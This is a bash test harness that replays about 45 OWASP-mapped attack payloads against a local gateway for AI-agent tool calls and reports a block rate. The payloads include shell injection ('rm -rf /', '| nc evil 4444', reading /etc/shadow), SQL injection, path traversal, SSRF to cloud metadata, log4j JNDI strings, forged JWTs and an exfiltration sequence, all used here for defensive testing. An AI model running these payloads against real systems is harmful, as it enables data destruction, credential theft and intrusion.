#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# External attack replay — fires ~45 OWASP-mapped payloads at the running
# gateway with curl and prints BLOCKED / ALLOWED per payload. Zero installs
# beyond curl. Run the gateway first (see README), then: bash attack_replay.sh
# ---------------------------------------------------------------------------
URL="${URL:-http://127.0.0.1:8080/rpc}"
TOKEN="$(cat "$(dirname "$0")/TOKEN.txt")"
AUTH="Authorization: Bearer $TOKEN"
CT="Content-Type: application/json"
pass=0; fail=0; n=0

hit () { # $1=class $2=tool $3=arg-json  -> expect BLOCKED
  n=$((n+1))
  body="{\"jsonrpc\":\"2.0\",\"id\":$n,\"method\":\"tools/call\",\"params\":{\"name\":\"$2\",\"arguments\":$3}}"
  code=$(curl -s -o /tmp/r.json -w "%{http_code}" -X POST "$URL" -H "$AUTH" -H "$CT" -d "$body")
  err=$(grep -o '"code":-320[0-9][0-9]' /tmp/r.json | head -1)
  if [ "$code" = "400" ] || [ "$code" = "401" ] || [ "$code" = "413" ] || [ -n "$err" ]; then
    printf "  \033[32mBLOCKED\033[0m  %-22s %s\n" "$1" "${3:0:46}"; pass=$((pass+1))
  else
    printf "  \033[31mALLOWED\033[0m  %-22s %s\n" "$1" "${3:0:46}"; fail=$((fail+1))
  fi
}

raw () { # raw body -> expect blocked (protocol tests)
  n=$((n+1))
  code=$(curl -s -o /tmp/r.json -w "%{http_code}" -X POST "$URL" -H "$AUTH" -H "$CT" -d "$1")
  err=$(grep -o '"code":-320[0-9][0-9]' /tmp/r.json | head -1)
  if [ "$code" = "400" ] || [ -n "$err" ]; then printf "  \033[32mBLOCKED\033[0m  %-22s %s\n" "$2" "${1:0:46}"; pass=$((pass+1));
  else printf "  \033[31mALLOWED\033[0m  %-22s %s\n" "$2" "${1:0:46}"; fail=$((fail+1)); fi
}

echo "=== Command / shell injection (MCP05, ASI03) ==="
for p in 'rm -rf /' '; cat /etc/passwd' '$(reboot)' '`id`' '| nc evil 4444' '&& whoami' 'cat /etc/shadow'; do
  hit cmd_injection execute_bash "{\"cmd\":\"$p\"}"; done

echo "=== SQL injection (MCP05) ==="
for p in "' OR '1'='1" "'; DROP TABLE users;--" "1 UNION SELECT password FROM users" "admin'--"; do
  hit sqli db_read "{\"q\":\"$p\"}"; done

echo "=== Path traversal (MCP05) ==="
for p in '../../../../etc/passwd' '/etc/passwd' '/etc/shadow' 'file:///etc/passwd'; do
  hit path_traversal read_file "{\"path\":\"$p\"}"; done

echo "=== SSRF (API7, ASI03) ==="
for p in 'http://169.254.169.254/latest/meta-data/' 'http://localhost:6379' 'http://[::1]:22'; do
  hit ssrf fetch_url "{\"url\":\"$p\"}"; done

echo "=== XSS / template / log4j (MCP05, MCP06) ==="
hit xss execute_bash '{"cmd":"<script>alert(1)</script>"}'
hit xss execute_bash '{"cmd":"<img src=x onerror=alert(1)>"}'
hit template execute_bash '{"cmd":"{{7*7}}"}'
hit log4j execute_bash '{"cmd":"${jndi:ldap://evil/x}"}'

echo "=== Encoded evasion (MCP05) ==="
hit cmd_b64 execute_bash '{"cmd":"cm0gLXJmIC8="}'      # base64 rm -rf /
hit cmd_url execute_bash '{"cmd":"rm%20-rf%20%2F"}'    # url-encoded

echo "=== Auth bypass (MCP07, API2, ASI04) ==="
n=$((n+1)); code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" -H "$CT" -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{}}}')
[ "$code" = "401" ] && { echo -e "  \033[32mBLOCKED\033[0m  no_token"; pass=$((pass+1)); } || { echo -e "  \033[31mALLOWED\033[0m  no_token"; fail=$((fail+1)); }
FORGED=$(python3 -c "import jwt,time;print(jwt.encode({'sub':'admin_agent','aud':'mcp-gateway','iss':'mcp-gateway-idp','exp':int(time.time())+99},'mock_secret_key',algorithm='HS256'))" 2>/dev/null)
if [ -n "$FORGED" ]; then n=$((n+1)); code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" -H "Authorization: Bearer $FORGED" -H "$CT" -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{}}}')
[ "$code" = "401" ] && { echo -e "  \033[32mBLOCKED\033[0m  forged_mock_secret"; pass=$((pass+1)); } || { echo -e "  \033[31mALLOWED\033[0m  forged_mock_secret"; fail=$((fail+1)); }; fi

echo "=== Protocol / batch bypass (API8) ==="
raw '[{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"execute_bash","arguments":{"cmd":"rm -rf /"}}}]' batch_injection
raw '{"jsonrpc":"2.0","id":1,"method":"evil/backdoor"}' unknown_method
raw '[{"bad":1}]' malformed
raw '{"jsonrpc":"1.0","id":1,"method":"tools/list"}' bad_version

echo "=== IFC exfiltration (MCP10, API6, ASI06) ==="
SID="exfil$RANDOM"; T2=$(python3 -c "import jwt;print(jwt.encode({'sub':'agent-1','sid':'$SID','scope':'','aud':'mcp-gateway','iss':'mcp-gateway-idp','exp':4102444800},'benchmark-dev-secret-key-0123456789abcdef',algorithm='HS256'))" 2>/dev/null)
curl -s -o /dev/null -X POST "$URL" -H "Authorization: Bearer $T2" -H "$CT" -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{}}}'
n=$((n+1)); curl -s -o /tmp/r.json -X POST "$URL" -H "Authorization: Bearer $T2" -H "$CT" -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"http_post","arguments":{"data":"secret"}}}'
grep -q '"code":-32001' /tmp/r.json && { echo -e "  \033[32mBLOCKED\033[0m  read_then_exfiltrate"; pass=$((pass+1)); } || { echo -e "  \033[31mALLOWED\033[0m  read_then_exfiltrate"; fail=$((fail+1)); }

echo "=== DoS oversize body (API4, ASI08) ==="
n=$((n+1))
python3 -c "open('/tmp/big.json','w').write('{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/call\",\"params\":{\"name\":\"read_file\",\"arguments\":{\"b\":\"'+'A'*1200000+'\"}}}')"
code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" -H "$AUTH" -H "$CT" -d @/tmp/big.json)
[ "$code" = "413" ] && { echo -e "  \033[32mBLOCKED\033[0m  oversize_body (413)"; pass=$((pass+1)); } || { echo -e "  \033[31mALLOWED\033[0m  oversize_body ($code)"; fail=$((fail+1)); }

echo ""
echo "========================================================"
echo "  RESULT: $pass BLOCKED / $((pass+fail)) attacks  =  $(python3 -c "print(round(100*$pass/($pass+$fail),1))")% block rate"
echo "========================================================"
